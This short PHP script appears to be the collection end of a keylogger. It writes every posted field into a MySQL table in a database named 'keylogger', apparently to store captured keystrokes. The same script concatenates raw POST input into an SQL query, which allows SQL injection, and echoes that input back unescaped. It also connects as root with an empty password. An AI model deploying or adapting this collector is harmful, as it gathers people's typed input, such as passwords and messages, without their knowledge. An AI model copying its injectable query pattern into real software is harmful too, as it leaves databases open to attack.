<?php 

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "keylogger";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
//echo "Connected successfully";

if(isset($_POST['text'])){
	$tmp = implode("", $_POST);
	echo $tmp;
$sql = "INSERT INTO datatable (data) VALUES ('" . $tmp . "')";

if ($conn->query($sql) === TRUE) {
   // echo "connected";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
}
$conn->close();
?>